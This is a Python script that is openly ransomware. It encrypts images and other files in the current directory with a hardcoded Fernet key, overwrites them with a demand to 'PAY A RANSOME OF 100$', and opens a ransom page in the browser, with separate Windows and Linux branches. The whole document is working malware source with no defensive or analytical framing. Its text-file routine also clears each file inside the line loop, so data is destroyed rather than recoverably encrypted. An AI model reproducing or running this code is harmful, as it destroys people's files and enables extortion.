#just import os.walk() to traverse all the files of the system
import os
import platform
import time
from cryptography.fernet import Fernet
import webbrowser

#encryption
def encryption():
    global key
    #key=Fernet.generate_key()
    key=b'K3hf9o2oMs66nEiywHCwoJaK9ws4ew4447ku9hypBSo='
    #content=bytes()
    #encrypted_text=f.encrypt()

def clear_the_file(file):
    with open (file,'w') as fh:
        fh.write('PAY A RANSOME OF 100$ TO GET YOUR DATA DECRYPTED!\n')
        fh.write('{}\n'.format(time.ctime()))



#checking the operating system
def os_check():
    global operating_system
    operating_system=platform.system()

#ransomware for windows 
def windows_ransomware():
    global file
    #global lines
    encryption()
    #print("the current working directory: {}".format(os.getcwd()))
    #print("directories:\n{}".format(os.listdir()))
    for file in os.listdir():
        f = Fernet(key)
        if('.' in file):
            if file =='ransomware.py' or file.endswith(".git") or file=="index.html" or file=="requirements.txt" or file=="LICENSE" or file=="README.md":
                continue
            else:
                if (file.endswith(".jpeg") or file.endswith(".png") or file.endswith(".gif")):
                    image_file=open(file,'rb')
                    image=image_file.read()
                    image_file.close()
                    encrypted_image=f.encrypt(image)
                    with open(file,'wb') as image_file_handle:
                        image_file_handle.write(encrypted_image)
                else:
                    with open (file,'r') as file_handle:
                        content=file_handle.readlines()
                        for lines in content:
                            value=bytes(lines,'utf-8')
                            byte_value=f.encrypt(value)
                            str_byte=str(byte_value)
                            clear_the_file(file)
                            with open (file,'a+') as encrypted_code:
                                encrypted_code.write(str_byte)
    webbrowser.open_new_tab("index.html")



    
#ransomware for linux
def linux_ransomware():
    #print("the current working directory: {}".format(os.command("pwd")))
    #print("directories:\n{}".format(os.command("ls")))
    for file in os.listdir():
        encryption()
        f = Fernet(key)
        if('.' in file):
            if file =='ransomware.py' or file=='index.html' or file.endswith(".git") or file=="requirements.txt" or file=="LICENSE" or file=="README.md":
                continue
            else:
                if (file.endswith(".jpeg") or file.endswith(".png") or file.endswith(".gif")):
                    image_file=open(file,'rb')
                    image=image_file.read()
                    image_file.close()
                    encrypted_image=f.encrypt(image)
                    with open(file,'wb') as image_file_handle:
                        image_file_handle.write(encrypted_image)
                else:
                    with open (file,'rb') as file_handle:
                        content=file_handle.readlines()
                        for lines in content:
                            #value=bytes(lines,'utf-8')
                            encrypted_value=f.encrypt(lines)
                            str_byte=str(encrypted_value)
                            clear_the_file(file)
                            with open (file,'a+') as encrypted_code:
                                encrypted_code.write(str_byte)
    webbrowser.open_new_tab("index.html")
        

#main body
if __name__=="__main__":
    os_check()
    if operating_system=="Windows":
        windows_ransomware()
    else:
        linux_ransomware()



